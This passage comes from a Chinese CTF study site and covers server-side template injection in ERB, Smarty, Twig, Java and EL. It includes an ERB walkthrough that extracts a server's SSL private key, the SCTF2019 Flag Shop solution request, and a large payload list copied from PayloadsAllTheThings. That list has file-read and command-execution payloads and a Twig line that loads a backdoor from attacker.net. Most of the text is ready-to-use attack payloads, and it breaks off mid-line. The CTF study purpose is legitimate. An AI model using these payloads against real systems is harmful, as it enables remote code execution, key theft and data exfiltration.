<p>\u7ed3\u679c\u770b\u8d77\u6765\u5c31\u662fRuby\u7684\u98ce\u683c\u3002\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u8bd5\u7740\u83b7\u53d6self\u5bf9\u8c61\u7684\u7c7b\u540d\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.class.name\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u7c7b\u540d\u4e3a\u201cTemplateInjection\u201d\u3002\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u201c\u8bbf\u95ee\u201d\u8fd9\u4e2a\u63a7\u5236\u63a5\u53e3\uff0c\u6211\u4eec\u80fd\u7528\u5b83\u6765\u5e72\u5565\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u679a\u4e3eTemplateInjection\u7c7b\u7684\u53ef\u7528\u65b9\u6cd5\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.methods\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u8fd9\u4e9b\u51fd\u6570\uff0c\u601d\u8003\u54ea\u4e9b\u6570\u636e\u53ef\u4ee5\u4f20\u9012\u7ed9\u8fd9\u4e9b\u51fd\u6570\uff0c\u4ee5\u5b9e\u73b0\u672a\u6388\u6743\u8bbf\u95ee\u76ee\u7684\u3002\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695a\u8be5\u5e94\u7528\u5177\u4f53\u4f7f\u7528\u7684web\u6846\u67b6\uff0c\u4f46\u7531\u4e8e\u6211\u4eec\u6b63\u5f80\u670d\u52a1\u5668\u53d1\u9001HTTP POST\u8bf7\u6c42\uff0c\u56e0\u6b64\u53ef\u4ee5\u731c\u5230\u6211\u4eec\u5f88\u6709\u53ef\u80fd\u5904\u4e8ehandlePOST\u6216\u8005doPOST\u51fd\u6570\u5185\u90e8\u3002\u4e5f\u8bb8\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u8bbf\u95ee\u67d0\u4e9b\u5c40\u90e8\u53d8\u91cf\u3002</p> <p>\u5982\u679c\u5927\u5bb6\u4e0d\u719f\u6089Ruby\uff0c\u8fd9\u91cc\u6211\u7a0d\u5fae\u4ecb\u7ecd\u4e0b\u3002Ruby\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u5143\u7f16\u7a0b\uff08metaprogramming\uff09\u4ee5\u53ca\u5185\u7701\uff08introspection\uff09\u529f\u80fd\uff0c\u8bfb\u8005\u53ef\u4ee5\u8bbf\u95ee\u6b64\u94fe\u63a5\u4e86\u89e3\u66f4\u591a\u7ec6\u8282\u3002\u4f5c\u4e3a\u653b\u51fb\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5176\u4e2d\u67d0\u4e9b\u529f\u80fd\uff08\u5982\u524d\u9762\u63d0\u5230\u7684\u7c7b\u7684.methods\u4ee5\u53ca.name\u65b9\u6cd5\uff09\u6765\u63a2\u7d22\u7a0b\u5e8f\u7684\u5185\u90e8\u7ed3\u6784\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u8f7d\u8377\u83b7\u53d6\u76ee\u6807\u6240\u9700\u7684\u5177\u4f53\u53c2\u6570\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.method(:handle_POST).parameters\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u4ece\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u53ef\u77e5handle_POST\u9700\u89813\u4e2areq\u53c2\u6570\uff0c\u8be5\u53c2\u6570\u53ef\u80fd\u4ee3\u8868\u7684\u662f\u67d0\u4e2a\u8bf7\u6c42\uff08request\uff09\u5bf9\u8c61\uff1brsp\u53c2\u6570\u53ef\u80fd\u4ee3\u8868\u7684\u662f\u54cd\u5e94\u6570\u636e\u7684\u5f15\u7528\uff1b\u6700\u540e\u7684session\u53c2\u6570\u53ef\u80fd\u662f\u67d0\u4e2aid\u6216\u8005\u67d0\u4e2a\u5bf9\u8c61\u3002\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u63a2\u7d22\uff0c\u4ee5\u786e\u8ba4session\u5bf9\u8c61\u7684\u5177\u4f53\u542b\u4e49\uff0c\u4f7f\u7528\u7684\u8f7d\u8377\u5982\u4e0b\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0session.class.name\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u4e0a\u8ff0\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u89c2\u5bdf\u5230\u7684\u662f\u201cWEBrick\u201d\uff0c\u8fd9\u662fRuby\u5728\u6807\u51c6\u5e93\u4e2d\u5b9e\u73b0\u7684\u539f\u751fweb\u670d\u52a1\u5668\u3002\u6211\u4eec\u5f53\u7136\u53ef\u4ee5\u7ee7\u7eed\u63a2\u7d22\u8fd9\u4e2asession\u5bf9\u8c61\uff0c\u4f46\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u4e00\u4e9b\u76ee\u6807\u66f4\u503c\u5f97\u6211\u4eec\u63a2\u7d22\uff0c\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u91cd\u70b9\u5173\u6ce8\u4e0e\u5f53\u524d\u4f1a\u8bdd\u6709\u5173\u7684\u90a3\u4e9b\u6570\u636e\u3002\u7b80\u5355\u7ffb\u9605WEBrick\u6587\u6863\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u67d0\u4e9b\u53d8\u91cf\u4f1a\u4f20\u9012\u7ed9Servlet\u4ee5\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u67d0\u4e9b\u5185\u7701\uff08introspection\uff09\u65b9\u6cd5\uff0c\u4ee5\u786e\u8ba4\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u53d8\u91cf\u4ee5\u53ca\u5176\u4ed6\u53ef\u7528\u53d8\u91cf\u3002</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.instance_variables\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>\u5f53WEBrick\u88ab\u5b9e\u4f8b\u5316\u4ee5\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42\u65f6\uff0c\u5b83\u4f1a\u5c06\u67d0\u4e2ahttp\u670d\u52a1\u5668\u5b9e\u4f8b\u4f20\u9012\u7ed9servlet\uff0c\u8fd9\u5f88\u6709\u53ef\u80fd\u5c31\u662f@server\u8fd9\u4e2a\u5b9e\u4f8b\u53d8\u91cf\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u8bc1\u5b9e\u8fd9\u4e2a\u731c\u60f3\uff0c\u540c\u65f6\u89c2\u5bdf\u8fd9\u4e2a\u5bf9\u8c61\u5305\u542b\u54ea\u4e9b\u6210\u5458\u53d8\u91cf\u3002\u6211\u4eec\u540c\u6837\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528.instance_variables\u65b9\u6cd5\u6765\u8bc1\u5b9e\u8fd9\u4e00\u70b9\uff1a</p> <pre><code>ruby\u00a0&lt;%=@server.instance_variables\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <pre><code>ruby\u00a0&lt;%\u00a0ssl=@server.instance_variable_get(:@ssl_context)\u00a0%&gt;&lt;%=\u00a0ssl.instance_variables\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <p>@key\u770b\u8d77\u6765\u975e\u5e38\u6709\u8da3\uff0c\u6211\u4eec\u53ef\u4ee5\u63d0\u53d6\u8fd9\u4e2a\u503c\uff1a</p> <pre><code>ruby\u00a0&lt;%\u00a0ssl\u00a0=\u00a0@server.instance_variable_get(:@ssl_context)\u00a0%&gt;&lt;%=\u00a0ssl.instance_variable_get(:@key)\u00a0%&gt;\nPlain Text\n</code></pre> <p></p> <pre><code>ruby &lt;%= self %&gt;\nruby &lt;%= self.class.name %&gt;\nruby &lt;%= self.methods %&gt;\nruby &lt;%= self.method(:handle_POST).parameters %&gt;\n----\nruby &lt;%= session.class.name %&gt;\nruby &lt;%= self.instance_variables %&gt;\nruby &lt;%=@server.instance_variables %&gt;\nruby &lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;\nruby &lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;\u5176\u5b9e\u5c31\u662f\u4e2a\u6c99\u76d2\u9003\u9038\uff1f\nPlain Text\n</code></pre> <p>\u7406\u89e3flask\u4e4b\u540e\u770b\u8fd9\u4e2a\u591a\u591a\u5c11\u5c11\u90fd\u80fd\u770b\u61c2\u5927\u90e8\u5206\u5427\uff0c\u5bf9\u5427\u5bf9\u5427\u5bf9\u5427\uff1f</p>"},{"location":"web/ssti/erb%E6%B3%A8%E5%85%A5/#ruby","title":"ruby\u9884\u5b9a\u4e49\u53d8\u91cf","text":"<p>\u9884\u5b9a\u4e49\u53d8\u91cf\uff1a</p> <pre><code>Pre-defined variables\n$!\nThe exception information message set by 'raise'.\n$@\nArray of backtrace of the last exception thrown.\n$&amp;\nThe string matched by the last successful match.\n$`\nThe string to the left of the last successful match.\n$'\nThe string to the right of the last successful match.\n$+\nThe highest group matched by the last successful match.\n$1\nThe Nth group of the last successful match. May be &gt; 1.\n$~\nThe information about the last match in the current scope.\n$=\nThe flag for case insensitive, nil by default.\n$/\nThe input record separator, newline by default.\n$\\\nThe output record separator for the print and IO#write. Default is nil.\n$,\nThe output field separator for the print and Array#join.\n$;\nThe default separator for String#split.\n$.\nThe current input line number of the last file that was read.\n$&lt;\nThe virtual concatenation file of the files given on command line (or from $stdin if no files were given).\n$&gt;\nThe default output for print, printf. $stdout by default.\n$_\nThe last input line of string by gets or readline.\n$0\nContains the name of the script being executed. May be assignable.\n$*\nCommand line arguments given for the script sans args.\n$$\nThe process number of the Ruby running this script.\n$?\nThe status of the last executed child process. This value is thread-local.\n$:\nLoad path for scripts and binary modules by load or require.\n$\u201c\nThe array contains the module names loaded by require.\n$DEBUG\nThe debug flag, which is set by the -d switch. Enabling debug output prints each exception raised to $stderr (but not its backtrace). Setting this to a true value enables debug output as if -d were given on the command line. Setting this to a false value disables debug output.\n$LOADED_FEATURES\nThe alias to the $\u201c.\n$FILENAME\nCurrent input file from $&lt;. Same as $&lt;.filename.\n$LOAD_PATH\nThe alias to the $:.\n$stderr\nThe current standard error output.\n$stdin\nThe current standard input.\n$stdout\nThe current standard output.\n$VERBOSE\nThe verbose flag, which is set by the -w or -v switch. Setting this to a true value enables warnings as if -w or -v were given on the command line. Setting this to nil disables warnings, including from Kernel#warn.\n$-0\nThe alias to $/.\n$-a\nTrue if option -a is set. Read-only variable.\n$-d\nThe alias of $DEBUG. See $DEBUG above for further discussion.\n$-F\nThe alias to $;.\n$-i\nIn in-place-edit mode, this variable holds the extension, otherwise nil.\n$-I\nThe alias to $:.\n$-l\nTrue if option -l is set. Read-only variable.\n$-p\nTrue if option -p is set. Read-only variable.\n$-v\nAn alias of $VERBOSE. See $VERBOSE above for further discussion.\n$-w\nAn alias of $VERBOSE. See $VERBOSE above for further discussion.\nPre-defined global constants\nTRUE\nThe typical true value.\nFALSE\nThe false itself.\nNIL\nThe nil itself.\nSTDIN\nThe standard input. The default value for $stdin.\nSTDOUT\nThe standard output. The default value for $stdout.\nSTDERR\nThe standard error output. The default value for $stderr.\nENV\nThe hash contains current environment variables.\nARGF\nThe alias to the $&lt;.\nARGV\nThe alias to the $*.\nDATA\nThe file object of the script, pointing just after __END__.\nRUBY_VERSION\nThe ruby version string (VERSION was deprecated).\nRUBY_RELEASE_DATE\nThe release date string.\nRUBY_PLATFORM\nThe platform identifier.\u5728\u5b98\u65b9\u6587\u6863https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u7ed9\u4e2a\u4f8b\u9898</p> <p>[SCTF2019]Flag Shop</p> <p>JWT\u4f2a\u9020\u90e8\u5206\u8df3\u8fc7\uff0c\u53ea\u5173\u6ce8\u5176\u4e2d\u7684erb\u6a21\u677f\u6ce8\u5165\u90e8\u5206\uff1b</p> <p>\u6e90\u7801\uff1a</p> <pre><code>require 'sinatra'\nrequire 'sinatra/cookies'\nrequire 'sinatra/json'\nrequire 'jwt'\nrequire 'securerandom'\nrequire 'erb'\nset :public_folder, File.dirname(__FILE__) + '/static'\nFLAGPRICE = 1000000000000000000000000000\nENV[\"SECRET\"] = SecureRandom.hex(64)\nconfigure do\nenable :logging\nfile = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\")\nfile.sync = true\nuse Rack::CommonLogger, file\nend\nget \"/\" do\nredirect '/shop', 302\nend\nget \"/filebak\" do\ncontent_type :text\nerb IO.binread __FILE__\nend\nget \"/api/auth\" do\npayload = { uid: SecureRandom.uuid , jkl: 20}\nauth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\nend\nget \"/api/info\" do\nislogin\nauth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\njson({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})\nend\nget \"/shop\" do\nerb :shop\nend\nget \"/work\" do\nislogin\nauth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\nauth = auth[0]\nunless params[:SECRET].nil?\nif ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\nputs ENV[\"FLAG\"]\nend\nend\nif params[:do] == \"#{params[:name][0,7]} is working\" then\nauth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\nauth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\nERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;\").result\nend\nend\npost \"/shop\" do\nislogin\nauth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\nif auth[0][\"jkl\"] &lt; FLAGPRICE then\njson({title: \"error\",message: \"no enough jkl\"})\nelse\nauth &lt;&lt; {flag: ENV[\"FLAG\"]}\nauth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\njson({title: \"success\",message: \"jkl is good thing\"})\nend\nend\n\ndef islogin\nif cookies[:auth].nil? then\nredirect to('/shop')\nend\nend\nPlain Text\n</code></pre> <p>\u91cd\u70b9\u4ee3\u7801</p> <pre><code>if params[:do] == \"#{params[:name][0,7]} is working\" then\nauth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\nauth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\nERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;\").result\nend\nend\nRuby\n</code></pre> <p>\u5173\u952e\u5728\u4e8e\uff1a</p> <pre><code>\"&lt;script&gt;alert('#{params[:name][0,7]}working successfully!')&lt;/script&gt;\"If do=name,\u7136\u540e\u622a\u53d6\u8fd98\u4e2a\u5b57\u7b26{\u5982\u679c\u6211\u4f20\u5165\u7684\u662f&lt;%7 *7 %&gt; }\u53d1\u73b0\u662f\u8fd4\u56de49\uff0c\u6a21\u677f\u6ce8\u5165\u9884\u5b9a\uff0c\u7136\u540e\u8fd9\u4e2a$\u2019\u5c31\u5f88\u50cf\u6b63\u5219\u5339\u914d\u4e00\u6837\u7684\u4e1c\u897f\uff0c\u89e3\u91ca\u662f\uff1aThe string to the right of the last successful match.\u5f88\u4e0d\u5e78\u8fd0\u7684\u7684\u5c31\u662f\u2026\u8fd9\u91cc\u5c31\u662f\u90a3\u4e2a\u4ea7\u751f\u7684\u968f\u673a\u5bc6\u94a5\u3002\nPlain Text\n</code></pre> <p>$'-\u6700\u540e\u4e00\u6b21\u6210\u529f\u5339\u914d\u53f3\u8fb9\u7684\u5b57\u7b26\u4e32</p> <p>\uff08\u73af\u5883\u5173\u7cfb\uff0c\u6211\u4e0d\u592a\u4f1a\u5f04\uff0c\u4f46\u662f\u5173\u6ce8\u70b9\u5e94\u8be5\u662fruby\u4e2d\u7684\u6b63\u5219\u5339\u914d\u6a21\u5f0f\u4e5f\u5373\uff1a~\u548cmatch\uff09</p> <p>\u6784\u9020do=&lt;%=\u2019%&gt;is working\u548cname=&lt;%=\u2019%&gt;,\u8bb0\u5f97\u628a\u91cc\u9762\u5185\u5bb9\u8f6c\u6210\u5341\u516d\u8fdb\u5236</p> <p>\u6240\u4ee5\u6700\u7ec8\u5c31\u662f</p> <p>SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</p>"},{"location":"web/ssti/php/","title":"PHP\u6a21\u677f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5355\u72ec\u62c9flask\u6765\u8bf4\u662f\u56e0\u4e3a\u5b83\u5b9e\u5728\u662f\u611f\u89c9\u975e\u5e38\u91cd\u8981\uff0c\u800c\u4e14\u662f\u7406\u89e3\u8fd0\u7528\u5176\u4ed6\u6a21\u677f\u7684\u57fa\u7840\uff08c\u8bed\u8a00\uff1f\uff09</p> <p>\u63a5\u4e0b\u6765\u662f\u4e24\u4e2aphp\u76f8\u5173\u7684\u6a21\u677f</p>"},{"location":"web/ssti/php/#smarty","title":"smarty","text":"<p>Smarty\u662f\u4e00\u4e2aPHP\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u63d0\u4f9b\u8ba9\u7a0b\u5e8f\u903b\u8f91\u4e0e\u9875\u9762\u663e\u793a\uff08HTML/CSS\uff09\u4ee3\u7801\u5206\u79bb\u7684\u529f\u80fd\u3002</p> <p>\u8fd9\u4e2a\u6a21\u677f\u597d\u50cf\u662f\u6709\u4e9b\u5e74\u5934\u4e86\uff0c\u78b0\u5230\u7684\u6b21\u6570\u4e5f\u662f\u5f88\u5c11\uff0c\u4f46\u6bd4\u8d5b\u53ef\u4e0d\u4f1a\u7ba1\u4f60\u5b66\u6ca1\u5b66\u4f1a\u4e0d\u4f1a\uff0c\u6240\u4ee5\u8fd8</p> <p>\u662f\u5728\u8fd9\u7b80\u5355\u7684\u4ecb\u7ecd\u4ecb\u7ecd\u3002\uff08\u6211\u662f\u60f3\u62c9\u4e2a\u4f8b\u9898\u7684\uff0c\u4f46\u662f\u6ca1\u627e\u5230\uff09</p> <p>\u5229\u7528\u65b9\u5f0f\uff1a\uff08\u642c\u8fd0\u5de5</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u8f93\u5165{$smarty.version}\u5c31\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u7684smarty\u7684\u7248\u672c\u53f7</p> <p>Smarty\u652f\u6301\u4f7f\u7528<code>{php}{/php}</code>\u6807\u7b7e\u6765\u6267\u884c\u88ab\u5305\u88f9\u5176\u4e2d\u7684php\u6307\u4ee4\uff0c\u6700\u5e38\u89c4\u7684\u601d\u8def\u81ea\u7136\u662f\u5148\u6d4b\u8bd5\u8be5\u6807\u7b7e\u3002\uff08Smarty\u5df2\u7ecf\u5e9f\u5f03{php}\u6807\u7b7e\uff0c\u5f3a\u70c8\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\u3002\u5728Smarty 3.1\uff0c{php}\u4ec5\u5728SmartyBC\u4e2d\u53ef\u7528\u3002\uff09</p> <p><code>{literal}</code>\u53ef\u4ee5\u8ba9\u4e00\u4e2a\u6a21\u677f\u533a\u57df\u7684\u5b57\u7b26\u539f\u6837\u8f93\u51fa\u3002 \u8fd9\u7ecf\u5e38\u7528\u4e8e\u4fdd\u62a4\u9875\u9762\u4e0a\u7684Javascript\u6216css\u6837\u5f0f\u8868\uff0c\u907f\u514d\u56e0\u4e3aSmarty\u7684\u5b9a\u754c\u7b26\u800c\u9519\u88ab\u89e3\u6790\u3002</p> <p>\u901a\u8fc7self\u83b7\u53d6Smarty\u7c7b\u518d\u8c03\u7528\u5176\u9759\u6001\u65b9\u6cd5\u5b9e\u73b0\u6587\u4ef6\u8bfb\u5199\u88ab\u7f51\u4e0a\u5f88\u591a\u6587\u7ae0\u91c7\u7528\u3002</p> <p>Smarty\u7c7b\u7684getStreamVariable\u65b9\u6cd5\u7684\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>public function getStreamVariable($variable){        $_result = '';        $fp = fopen($variable, 'r+');        if ($fp) {            while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) {                $_result .= $current_line;            }            fclose($fp);            return $_result;        }        $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this;        if ($smarty-&gt;error_unassigned) {            throw new SmartyException('Undefined stream variable \"' . $variable . '\"');        } else {            return null;        }    }\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\u5e76\u8fd4\u56de\u5176\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528self\u6765\u83b7\u53d6Smarty\u5bf9\u8c61\u5e76\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5f88\u591a\u6587\u7ae0\u91cc\u7ed9\u7684payload\u90fd\u5f62\u5982\uff1a{self::getStreamVariable(\u201cfile:///etc/passwd\u201d)}\u3002</p> <p>Smarty\u7684{if}\u6761\u4ef6\u5224\u65ad\u548cPHP\u7684if\u975e\u5e38\u76f8\u4f3c\uff0c\u53ea\u662f\u589e\u52a0\u4e86\u4e00\u4e9b\u7279\u6027\u3002\u6bcf\u4e2a{if}\u5fc5\u987b\u6709\u4e00\u4e2a\u914d\u5bf9\u7684{/if}\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528{else} \u548c {elseif}\uff0c\u5168\u90e8\u7684PHP\u6761\u4ef6\u8868\u8fbe\u5f0f\u548c\u51fd\u6570\u90fd\u53ef\u4ee5\u5728if\u5185\u4f7f\u7528\uff0c\u5982||, or, &amp;&amp;, and, is_array(), \u7b49\u7b49\uff0c\u5982\uff1a{if is_array($array)}{/if}\u90a3\u4e48\u540c\u6837\u7684\uff0c\u5728\u5229\u7528\u7684\u8fc7\u7a0b\u4e2d{ifsystem(\u2018cat \\flag\u2019)}{/if},\u4ea6\u6216\u8005\u662f{if readfile (\u2018/flag\u2019)}{/if}</p> <p>\u5927\u6982\u5c31\u8fd9\u4e48\u70b9\u4e86\uff0c\u5bf9\u4e86\u4f8b\u9898\uff1a\uff08\u81ea\u5df1\u53bb\u641c\u641c\uff09</p> <p>CISCN2019\u534e\u4e1c\u5357\u8d5b\u533aWeb11</p> <p>[BJDCTF2020]The mystery of ip</p>"},{"location":"web/ssti/php/#twig","title":"twig","text":"<p>\u53e6\u5916\u4e00\u4e2aphp\u6a21\u677f\uff0c\u5176\u5b9e\u6709\u4e09\u4e2a\uff0c\u8fd9\u91cc\u53ea\u5199\u4e86\u4e24\u4e2a\uff0c\u5269\u4e0b\u7684\u90a3\u4e2a\u5b9e\u5728\u662f\u6ca1\u6709\u9047\u89c1\u8fc7</p> <p>\u8fd9\u4e2a\u4e5f\u633a\u5c11\u89c1\u7684\uff08\u5bf9\u6211\u6765\u8bf4</p> <p>\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e~\u53ea\u80fd~\u653e\u4e00\u4e9b\u66b4\u529b\u4e00\u70b9\u7684payload\u4e86</p> <pre><code>Twig - Basic injection\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{app.request.server.all|join(',')}}\nTwig - Template format\n$output = $twig &gt; render (\n'Dear' . $_GET['custom_greeting'],\narray(\"first_name\" =&gt; $user.first_name)\n);\n$output = $twig &gt; render (\n\"Dear {first_name}\",\narray(\"first_name\" =&gt; $user.first_name)\n);\nTwig - Arbitrary File Reading\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\nTwig - Code execution\n{{self}}\n{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{['cat\\x20/etc/passwd']|filter('system')}}\n{{['cat$IFS/etc/passwd']|filter('system')}}\nExample with an email passing FILTER_VALIDATE_EMAIL PHP.\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld\n\u55ef\u662f\u7684\uff0c\u6ca1\u9519\uff0c\u5c31\u662f\u8fd9\u6837\uff08\u6307\u767d\u5ad6\u602a\uff09\nPlain Text\n</code></pre> <p>\u6765\u81eagithub\u4e0a\u67d0\u4f4d\u8001\u54e5\u7684\u6770\u4f5c\u3002</p>"},{"location":"web/ssti/%E6%9A%B4%E5%8A%9Bpayload/","title":"\u66b4\u529bpayload","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u6a21\u677f\u592a\u591a\uff0c\u5b66\u7684\u4e1c\u897f\u53c8\u592a\u5c11\uff1f</p> <p>\u8fd8\u5728\u62c5\u5fc3\u78b0\u5230\u65b0\u6a21\u677f\u4e0d\u4f1a\u505a\uff1f</p> <p>\u5bb3\u6015\u8fd9\u5f20\u56fe\uff1f</p> <p>\u66b4\u529b\u771f\u7684\u80fd\u591f\u89e3\u51b3\u5f88\u591a\u95ee\u9898\uff08\u6211\u7ed9\u4eba\u5bb6\u6574\u4e2a\u642c\u8fd0\u8fc7\u6765\u4e86\uff09</p> <pre><code>\u6765\u6e90\uff1ahttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twigRuby\nRuby - Basic injections\nERB:\n&lt;%= 7 * 7 %&gt;\nSlim:\n#{ 7 * 7 }\nRuby - Retrieve /etc/passwd\n&lt;%= File.open('/etc/passwd').read %&gt;\nRuby - List files and directories\n&lt;%= Dir.entries('/') %&gt;\nRuby - Code execution\nExecute code using SSTI for ERB engine.\n&lt;%= system('cat /etc/passwd') %&gt;\n&lt;%= `ls /` %&gt;\n&lt;%= IO.popen('ls /').readlines()  %&gt;\n&lt;% require 'open3' %&gt;&lt;% @a,@b,@c,@d=Open3.popen3('whoami') %&gt;&lt;%= @b.readline()%&gt;\n&lt;% require 'open4' %&gt;&lt;% @a,@b,@c,@d=Open4.popen4('whoami') %&gt;&lt;%= @c.readline()%&gt;\nExecute code using SSTI for Slim engine.\n#{ %x|env| }\nJava\nJava - Basic injection\n${7*7}\n${{7*7}}\n${class.getClassLoader()}\n${class.getResource(\"\").getPath()}\n${class.getResource(\"../../../../../index.htm\").getContent()}\nJava - Retrieve the system\u2019s environment variables\n${T(java.lang.System).getenv()}\nJava - Retrieve /etc/passwd\n${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}\nExpression Language EL\nExpression Language EL - Basic injection\n${1+1}\n#{1+1}\nExpression Language EL - Code Execution\n// Common RCE payloads\n''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(&lt;COMMAND STRING/ARRAY&gt;)\n''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(&lt;COMMAND ARRAY/LIST&gt;).start()\n// Method using Runtime\n#{session.setAttribute(\"rtc\",\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredConstructors()[0])}\n#{session.getAttribute(\"rtc\").setAccessible(true)}\n#{session.getAttribute(\"rtc\").getRuntime().exec(\"/bin/bash -c whoami\")}\n// Method using processbuilder\n${request.setAttribute(\"c\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())}\n${request.getAttribute(\"c\").add(\"cmd.exe\")}\n${request.getAttribute(\"c\").add(\"/k\")}\n${request.getAttribute(\"c\").add(\"ping x.x.x.x\")}\n${request.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance(request.getAttribute(\"c\")).start())}\n${request.getAttribute(\"a\")}\n// Method using Reflection &amp; Invoke\n${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"calc.exe\")}\n// Method using ScriptEngineManager one-liner\n${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\\\\"ping x.x.x.x\\\\\\\")\"))}\n// Method using ScriptEngineManager\n${facesContext.getExternalContext().setResponseHeader(\"output\",\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\\\"var x=new 